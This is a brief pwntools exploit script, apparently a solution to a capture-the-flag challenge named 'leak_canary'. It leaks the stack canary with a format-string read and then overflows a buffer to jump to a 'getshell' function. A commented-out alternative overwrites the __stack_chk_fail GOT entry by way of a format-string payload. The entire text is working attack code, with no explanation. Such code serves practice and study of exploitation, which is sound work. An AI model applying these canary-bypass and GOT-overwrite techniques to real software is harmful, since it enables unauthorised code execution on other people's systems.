from pwn import *
io = process("./leak_canary")
elf = ELF("./leak_canary")

#ans1
io.sendafter('!\n', '%31$p')
canary = int(io.recvuntil('00'), 16)
print 'canary: %s' % hex(canary)

payload = 'A'*100 + p32(canary) + 'B'*12 + p32(elf.symbols['getshell'])
io.send(payload)

"""
#ans2
io.send('hello world!')
payload = fmtstr_payload(6, {elf.got['__stack_chk_fail']:elf.symbols['getshell']})
io.send(payload.ljust(0x70, 'A'))
"""
io.interactive()